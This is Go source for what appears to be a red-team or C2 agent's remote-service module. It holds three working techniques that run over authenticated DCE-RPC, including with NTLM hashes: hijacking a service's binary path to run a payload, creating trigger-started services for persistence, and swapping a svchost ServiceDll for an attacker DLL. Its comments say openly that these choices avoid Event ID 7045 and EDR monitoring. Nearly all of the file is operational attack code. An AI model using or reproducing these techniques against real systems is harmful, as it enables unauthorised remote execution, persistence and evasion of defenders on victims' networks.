package commands

import (
	"context"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/rrp/winreg/v1"
	svcctl "github.com/oiweiwei/go-msrpc/msrpc/scmr/svcctl/v2"
	"github.com/oiweiwei/go-msrpc/ssp"
)

// SERVICE_NO_CHANGE indicates that a ChangeServiceConfigW field should not be modified.
const svcNoChange = 0xFFFFFFFF

// Service trigger constants
const (
	svcTriggerTypeIPAddress    = 0x00000002 // SERVICE_TRIGGER_TYPE_IP_ADDRESS_AVAILABILITY
	svcTriggerTypeDomainJoin   = 0x00000003 // SERVICE_TRIGGER_TYPE_DOMAIN_JOIN
	svcTriggerTypeFirewall     = 0x00000004 // SERVICE_TRIGGER_TYPE_FIREWALL_PORT_EVENT
	svcTriggerTypeGroupPolicy  = 0x00000005 // SERVICE_TRIGGER_TYPE_GROUP_POLICY
	svcTriggerTypeCustom       = 0x00000020 // SERVICE_TRIGGER_TYPE_CUSTOM
	svcTriggerActionStart      = 0x00000001 // SERVICE_TRIGGER_ACTION_SERVICE_START
	svcConfigTriggerInfo       = 8          // SERVICE_CONFIG_TRIGGER_INFO info level
)

// Well-known trigger subtype GUIDs
var (
	// NETWORK_MANAGER_FIRST_IP_ADDRESS_ARRIVAL_GUID — fires when first IP address becomes available
	guidNetworkFirstIP = &dtyp.GUID{Data1: 0x4f27f2de, Data2: 0x14e2, Data3: 0x430b, Data4: []byte{0xa5, 0x49, 0x7c, 0xd4, 0x8c, 0xbc, 0x82, 0x45}}
	// DOMAIN_JOIN_GUID — fires when computer joins a domain
	guidDomainJoin = &dtyp.GUID{Data1: 0x1ce20aba, Data2: 0x9851, Data3: 0x4421, Data4: []byte{0x94, 0x30, 0x1d, 0xde, 0xb7, 0x66, 0xe8, 0x09}}
	// FIREWALL_PORT_OPEN_GUID — fires when a firewall port opens
	guidFirewallOpen = &dtyp.GUID{Data1: 0xb7569e07, Data2: 0x8421, Data3: 0x4ee0, Data4: []byte{0xad, 0x10, 0x86, 0x91, 0x5a, 0xfd, 0xad, 0x09}}
	// MACHINE_POLICY_PRESENT_GUID — fires on Group Policy refresh
	guidMachinePolicy = &dtyp.GUID{Data1: 0x659fcae6, Data2: 0x5bdb, Data3: 0x4da9, Data4: []byte{0xb1, 0xff, 0xca, 0x2a, 0x17, 0x8d, 0x46, 0xe0}}
)

// remoteSvcModifyPath hijacks an existing service by swapping its binary path,
// starting it, then restoring the original path. This is a stealthier alternative
// to creating a new service (avoids Event ID 7045 for service creation).
func remoteSvcModifyPath(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for modify-path action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for modify-path action (the attacker payload path)")
	}

	cli, scm, ctx, cancel, cleanup, err := remoteSvcConnect(args, scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer cancel()
	defer cleanup()
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	// Open the target service with change config + start + query + stop access
	svcResp, err := cli.OpenServiceW(ctx, &svcctl.OpenServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DesiredAccess:  svcChangeConfig | svcStart | svcStop | svcQueryConfig | svcQueryStatus,
	})
	if err != nil {
		return errorf("Failed to open service %q: %v", args.Name, err)
	}
	if svcResp.Return != 0 {
		return errorf("OpenServiceW error for %q: 0x%08x", args.Name, svcResp.Return)
	}
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: svcResp.Service}) }()

	// Query current config to save original binary path
	cfgResp, err := cli.QueryServiceConfigW(ctx, &svcctl.QueryServiceConfigWRequest{
		Service:      svcResp.Service,
		BufferLength: 8192,
	})
	if err != nil {
		return errorf("QueryServiceConfigW failed: %v", err)
	}

	originalBinPath := cfgResp.ServiceConfig.BinaryPathName
	originalStartType := cfgResp.ServiceConfig.StartType

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== modify-path on %s:%s ===\n", args.Server, args.Name))
	sb.WriteString(fmt.Sprintf("Original BinPath : %s\n", originalBinPath))
	sb.WriteString(fmt.Sprintf("Payload BinPath  : %s\n", args.BinPath))

	// Step 1: Change binary path to attacker payload
	changeResp, err := cli.ChangeServiceConfigW(ctx, &svcctl.ChangeServiceConfigWRequest{
		Service:        svcResp.Service,
		ServiceType:    svcNoChange,
		StartType:      svcNoChange,
		ErrorControl:   svcNoChange,
		BinaryPathName: args.BinPath,
	})
	if err != nil {
		return errorf("ChangeServiceConfigW (set payload) failed: %v", err)
	}
	if changeResp.Return != 0 {
		return errorf("ChangeServiceConfigW (set payload) error: 0x%08x", changeResp.Return)
	}
	sb.WriteString("Step 1: Binary path swapped to payload\n")

	// Step 2: Start the service (executes attacker payload)
	startResp, err := cli.StartServiceW(ctx, &svcctl.StartServiceWRequest{
		Service: svcResp.Service,
	})
	startOK := err == nil && startResp.Return == 0
	if startOK {
		sb.WriteString("Step 2: Service started (payload executing)\n")
	} else {
		// Service may fail to start (payload crashes, exits quickly, etc.) — still restore
		startErr := ""
		if err != nil {
			startErr = err.Error()
		} else {
			startErr = fmt.Sprintf("0x%08x", startResp.Return)
		}
		sb.WriteString(fmt.Sprintf("Step 2: Start returned error (may still have executed): %s\n", startErr))
	}

	// Brief pause to let the payload execute before stopping
	time.Sleep(2 * time.Second)

	// Step 3: Stop the service (best-effort — payload may already have exited)
	ctrlResp, err := cli.ControlService(ctx, &svcctl.ControlServiceRequest{
		Service: svcResp.Service,
		Control: svcControlStop,
	})
	if err == nil && ctrlResp.Return == 0 {
		sb.WriteString("Step 3: Service stopped\n")
	} else {
		sb.WriteString("Step 3: Stop skipped (service already stopped or exited)\n")
	}

	// Step 4: Restore original binary path and start type
	restoreResp, err := cli.ChangeServiceConfigW(ctx, &svcctl.ChangeServiceConfigWRequest{
		Service:        svcResp.Service,
		ServiceType:    svcNoChange,
		StartType:      originalStartType,
		ErrorControl:   svcNoChange,
		BinaryPathName: originalBinPath,
	})
	if err != nil || restoreResp.Return != 0 {
		errMsg := ""
		if err != nil {
			errMsg = err.Error()
		} else {
			errMsg = fmt.Sprintf("0x%08x", restoreResp.Return)
		}
		sb.WriteString(fmt.Sprintf("WARNING: Failed to restore original BinPath: %s\n", errMsg))
		sb.WriteString("Manual cleanup required!\n")
	} else {
		sb.WriteString("Step 4: Original binary path restored\n")
	}

	sb.WriteString("\nResult: Payload executed via service path hijack")
	return successResult(sb.String())
}

// remoteSvcTrigger creates a new service configured with a trigger that fires
// on a specified event (network availability, domain join, firewall, group policy).
// This is stealthier than auto-start because trigger-started services are less
// monitored by EDR and don't appear in standard startup enumeration.
func remoteSvcTrigger(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for trigger action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for trigger action")
	}

	// Parse trigger type from start_type parameter (reuse for trigger type selection)
	triggerType, triggerGUID, triggerDesc := parseTriggerType(args.StartType)

	displayName := args.DisplayName
	if displayName == "" {
		displayName = args.Name
	}

	// Step 1: Create the service with demand start (not auto — the trigger handles starting)
	cli, scm, ctx, cancel, cleanup, err := remoteSvcConnect(args, scManagerCreateService|scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer cancel()
	defer cleanup()
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	createResp, err := cli.CreateServiceW(ctx, &svcctl.CreateServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DisplayName:    displayName,
		DesiredAccess:  svcAllAccess,
		ServiceType:    svcWin32OwnProcess,
		StartType:      svcStartDemand,
		ErrorControl:   1,
		BinaryPathName: args.BinPath,
	})
	if err != nil {
		return errorf("CreateServiceW failed: %v", err)
	}
	if createResp.Return != 0 {
		return errorf("CreateServiceW error: 0x%08x", createResp.Return)
	}
	defer func() { _, _ = cli.CloseService(ctx, &svcctl.CloseServiceRequest{ServiceObject: createResp.Service}) }()

	// Step 2: Set trigger configuration via ChangeServiceConfig2W
	triggerResp, err := cli.ChangeServiceConfig2W(ctx, &svcctl.ChangeServiceConfig2WRequest{
		Service: createResp.Service,
		Info: &svcctl.ConfigInfoW{
			InfoLevel: svcConfigTriggerInfo,
			ConfigInfoW: &svcctl.ConfigInfoW_ConfigInfoW{
				Value: &svcctl.ConfigInfoW_TriggerInfo{
					TriggerInfo: &svcctl.ServiceTriggerInfo{
						TriggersCount: 1,
						Triggers: []*svcctl.ServiceTrigger{
							{
								TriggerType:    triggerType,
								Action:         svcTriggerActionStart,
								TriggerSubtype: triggerGUID,
							},
						},
					},
				},
			},
		},
	})
	if err != nil {
		return errorf("ChangeServiceConfig2W (trigger) failed: %v\nNote: Service was created but trigger was not set. Clean up with: remote-service -action delete -server %s -name %s", err, args.Server, args.Name)
	}
	if triggerResp.Return != 0 {
		return errorf("ChangeServiceConfig2W (trigger) error: 0x%08x\nNote: Service was created but trigger was not set. Clean up with: remote-service -action delete -server %s -name %s", triggerResp.Return, args.Server, args.Name)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Trigger-started service created on %s ===\n", args.Server))
	sb.WriteString(fmt.Sprintf("Service Name : %s\n", args.Name))
	sb.WriteString(fmt.Sprintf("Display Name : %s\n", displayName))
	sb.WriteString(fmt.Sprintf("Binary Path  : %s\n", args.BinPath))
	sb.WriteString(fmt.Sprintf("Trigger      : %s\n", triggerDesc))
	sb.WriteString(fmt.Sprintf("Start Type   : DEMAND_START (trigger-activated)\n"))
	sb.WriteString(fmt.Sprintf("\nThe service will start automatically when the trigger fires.\n"))
	sb.WriteString(fmt.Sprintf("Cleanup: remote-service -action delete -server %s -name %s\n", args.Server, args.Name))

	return successResult(sb.String())
}

// parseTriggerType maps user-friendly trigger names to SVCCTL constants.
func parseTriggerType(input string) (uint32, *dtyp.GUID, string) {
	switch strings.ToLower(input) {
	case "domain-join", "domain_join", "domainjoin":
		return svcTriggerTypeDomainJoin, guidDomainJoin, "Domain Join (fires when computer joins a domain)"
	case "firewall", "firewall-open", "firewall_open":
		return svcTriggerTypeFirewall, guidFirewallOpen, "Firewall Port Open (fires when a port opens)"
	case "group-policy", "group_policy", "grouppolicy", "gpo":
		return svcTriggerTypeGroupPolicy, guidMachinePolicy, "Group Policy (fires on machine policy refresh)"
	default:
		// Default to network availability — most reliable, fires on every boot
		return svcTriggerTypeIPAddress, guidNetworkFirstIP, "Network Availability (fires when first IP address arrives)"
	}
}

// remoteSvcDLLSideload modifies a svchost-hosted service's ServiceDll registry
// value to point to an attacker DLL. When the service starts, svchost.exe loads
// the attacker DLL instead of the legitimate one.
func remoteSvcDLLSideload(args remoteServiceArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("Error: -name is required for dll-sideload action")
	}
	if args.BinPath == "" {
		return errorResult("Error: -binpath is required for dll-sideload action (path to attacker DLL on target)")
	}

	// Step 1: Verify service exists and get current config via SVCCTL
	svcCli, scm, svcCtx, svcCancel, svcCleanup, err := remoteSvcConnect(args, scManagerConnect)
	if err != nil {
		return errorResult(err.Error())
	}
	defer svcCancel()
	defer svcCleanup()
	defer func() { _, _ = svcCli.CloseService(svcCtx, &svcctl.CloseServiceRequest{ServiceObject: scm}) }()

	svcResp, err := svcCli.OpenServiceW(svcCtx, &svcctl.OpenServiceWRequest{
		ServiceManager: scm,
		ServiceName:    args.Name,
		DesiredAccess:  svcQueryConfig | svcQueryStatus | svcStop | svcStart,
	})
	if err != nil {
		return errorf("Failed to open service %q: %v", args.Name, err)
	}
	if svcResp.Return != 0 {
		return errorf("OpenServiceW error for %q: 0x%08x", args.Name, svcResp.Return)
	}
	defer func() { _, _ = svcCli.CloseService(svcCtx, &svcctl.CloseServiceRequest{ServiceObject: svcResp.Service}) }()

	cfgResp, err := svcCli.QueryServiceConfigW(svcCtx, &svcctl.QueryServiceConfigWRequest{
		Service:      svcResp.Service,
		BufferLength: 8192,
	})
	if err != nil {
		return errorf("QueryServiceConfigW failed: %v", err)
	}

	// Verify service is svchost-hosted (WIN32_SHARE_PROCESS type)
	if cfgResp.ServiceConfig.ServiceType&svcWin32ShareProcess == 0 {
		return errorf("Service %q is not svchost-hosted (type: %s). DLL sideload requires WIN32_SHARE_PROCESS services.",
			args.Name, remoteSvcTypeName(cfgResp.ServiceConfig.ServiceType))
	}

	// Step 2: Read current ServiceDll via WinReg RPC
	regCli, regCtx, regCancel, regCleanup, hklm, err := openRemoteRegistryHKLM(args)
	if err != nil {
		return errorf("WinReg connection failed: %v", err)
	}
	defer regCancel()
	defer regCleanup()
	defer func() { _, _ = regCli.BaseRegCloseKey(regCtx, &winreg.BaseRegCloseKeyRequest{Key: hklm}) }()

	regPath := fmt.Sprintf("SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", args.Name)
	subKey, err := openRemoteSubKey(regCtx, regCli, hklm, regPath)
	if err != nil {
		return errorf("Failed to open registry key %s: %v\nNote: Service may not have a Parameters subkey (not svchost-hosted?)", regPath, err)
	}
	defer func() { _, _ = regCli.BaseRegCloseKey(regCtx, &winreg.BaseRegCloseKeyRequest{Key: subKey}) }()

	// Read current ServiceDll value
	queryResp, err := regCli.BaseRegQueryValue(regCtx, &winreg.BaseRegQueryValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		DataLength: 4096,
		Length:     4096,
	})
	if err != nil {
		return errorf("Failed to read ServiceDll value: %v", err)
	}
	if queryResp.Return != 0 {
		return errorf("Failed to read ServiceDll: error code 0x%08x", queryResp.Return)
	}

	originalDll := decodeRegSZ(queryResp.Data[:queryResp.DataLength])

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== dll-sideload on %s:%s ===\n", args.Server, args.Name))
	sb.WriteString(fmt.Sprintf("Original ServiceDll: %s\n", originalDll))
	sb.WriteString(fmt.Sprintf("Attacker DLL       : %s\n", args.BinPath))

	// Step 3: Write attacker DLL path as ServiceDll
	dllData := encodeRegSZ(args.BinPath)
	setResp, err := regCli.BaseRegSetValue(regCtx, &winreg.BaseRegSetValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		Type:       2, // REG_EXPAND_SZ
		Data:       dllData,
		DataLength: uint32(len(dllData)),
	})
	if err != nil {
		return errorf("Failed to write ServiceDll: %v", err)
	}
	if setResp.Return != 0 {
		return errorf("Failed to write ServiceDll: error code 0x%08x", setResp.Return)
	}
	sb.WriteString("Step 1: ServiceDll registry value replaced\n")

	// Step 4: Restart the service to load attacker DLL
	// Stop first (best-effort)
	ctrlResp, err := svcCli.ControlService(svcCtx, &svcctl.ControlServiceRequest{
		Service: svcResp.Service,
		Control: svcControlStop,
	})
	if err == nil && ctrlResp.Return == 0 {
		sb.WriteString("Step 2: Service stopped\n")
		time.Sleep(2 * time.Second)
	} else {
		sb.WriteString("Step 2: Service was already stopped\n")
	}

	// Start with new DLL
	startResp, err := svcCli.StartServiceW(svcCtx, &svcctl.StartServiceWRequest{
		Service: svcResp.Service,
	})
	if err == nil && startResp.Return == 0 {
		sb.WriteString("Step 3: Service started (attacker DLL loaded)\n")
	} else {
		startErr := ""
		if err != nil {
			startErr = err.Error()
		} else {
			startErr = fmt.Sprintf("0x%08x", startResp.Return)
		}
		sb.WriteString(fmt.Sprintf("Step 3: Start returned error: %s\n", startErr))
	}

	// Step 5: Restore original ServiceDll
	origData := encodeRegSZ(originalDll)
	restoreResp, err := regCli.BaseRegSetValue(regCtx, &winreg.BaseRegSetValueRequest{
		Key:        subKey,
		ValueName:  &winreg.UnicodeString{Buffer: "ServiceDll"},
		Type:       2, // REG_EXPAND_SZ
		Data:       origData,
		DataLength: uint32(len(origData)),
	})
	if err != nil || restoreResp.Return != 0 {
		sb.WriteString("WARNING: Failed to restore original ServiceDll! Manual cleanup required.\n")
		sb.WriteString(fmt.Sprintf("Restore command: remote-reg -action set -server %s -hive HKLM -path %s -name ServiceDll -data \"%s\" -reg_type REG_EXPAND_SZ\n", args.Server, regPath, originalDll))
	} else {
		sb.WriteString("Step 4: Original ServiceDll restored\n")
	}

	sb.WriteString("\nResult: Attacker DLL loaded via svchost ServiceDll hijack")
	return successResult(sb.String())
}

// openRemoteRegistryHKLM opens a WinReg RPC connection to the remote host
// and opens the HKLM hive. Uses the same credential pattern as SVCCTL.
func openRemoteRegistryHKLM(args remoteServiceArgs) (winreg.WinregClient, context.Context, context.CancelFunc, func(), *winreg.Key, error) {
	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
	if credErr != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("%v for remote registry access", credErr)
	}

	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)

	cc, err := dcerpc.Dial(ctx, args.Server,
		dcerpc.WithEndpoint("ncacn_np:[winreg]"),
		dcerpc.WithCredentials(cred),
		dcerpc.WithMechanism(ssp.SPNEGO),
		dcerpc.WithMechanism(ssp.NTLM),
	)
	if err != nil {
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("DCE-RPC connection failed: %v", err)
	}

	cli, err := winreg.NewWinregClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
	if err != nil {
		cc.Close(ctx)
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to create WinReg client: %v", err)
	}

	cleanup := func() {
		cc.Close(ctx)
	}

	hklmResp, err := cli.OpenLocalMachine(ctx, &winreg.OpenLocalMachineRequest{
		DesiredAccess: 0x02000000, // MAXIMUM_ALLOWED
	})
	if err != nil {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("failed to open HKLM: %v", err)
	}
	if hklmResp.Return != 0 {
		cleanup()
		cancel()
		return nil, nil, nil, nil, nil, fmt.Errorf("OpenLocalMachine error: 0x%08x", hklmResp.Return)
	}

	return cli, ctx, cancel, cleanup, hklmResp.Key, nil
}

// encodeRegSZ encodes a string as null-terminated UTF-16LE bytes for registry REG_SZ/REG_EXPAND_SZ.
func encodeRegSZ(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, (len(runes)+1)*2)
	for i, r := range runes {
		buf[i*2] = byte(r)
		buf[i*2+1] = byte(r >> 8)
	}
	// null terminator already zeroed by make
	return buf
}

// decodeRegSZ decodes null-terminated UTF-16LE bytes to a Go string.
func decodeRegSZ(data []byte) string {
	if len(data) < 2 {
		return ""
	}
	var runes []rune
	for i := 0; i+1 < len(data); i += 2 {
		ch := uint16(data[i]) | uint16(data[i+1])<<8
		if ch == 0 {
			break
		}
		runes = append(runes, rune(ch))
	}
	return string(runes)
}
